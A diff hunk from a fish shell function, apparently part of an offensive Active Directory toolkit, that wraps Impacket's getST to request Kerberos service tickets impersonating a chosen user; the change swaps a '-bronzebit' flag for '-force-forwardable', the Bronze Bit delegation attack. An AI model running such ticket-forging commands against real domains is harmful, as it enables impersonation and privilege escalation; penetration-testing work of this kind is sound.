@@ -170,7 +170,7 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         else if command -v impacket-getST >/dev/null; set impacket_cmd impacket-getST
         else; echo "error: getST.py not found."; return 1; end
 
-        set -l st_args -spn "$spn" -impersonate "$user" -bronzebit -dc-ip "$target"
+        set -l st_args -spn "$spn" -impersonate "$user" -force-forwardable -dc-ip "$target"
         if test -n "$auth_hash"
             set -a st_args -hashes ":$auth_hash"
         else
